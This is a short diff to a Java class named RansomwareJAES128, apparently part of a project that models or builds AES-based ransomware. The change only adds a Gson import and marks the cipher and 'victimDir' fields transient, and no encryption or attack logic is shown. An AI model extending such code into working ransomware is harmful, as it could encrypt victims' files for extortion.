@@ -1,5 +1,6 @@
 package datos;
 
+import com.google.gson.annotations.Expose;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
@@ -10,8 +11,8 @@ import javax.crypto.spec.SecretKeySpec;
 
 public class RansomwareJAES128 extends Ransomware {
 
-    private Cipher cipher;
-    private String victimDir;
+    private transient Cipher cipher;
+    private transient String victimDir;
 
     public RansomwareJAES128(String nombre, String descripcion) {
         super(nombre, descripcion);
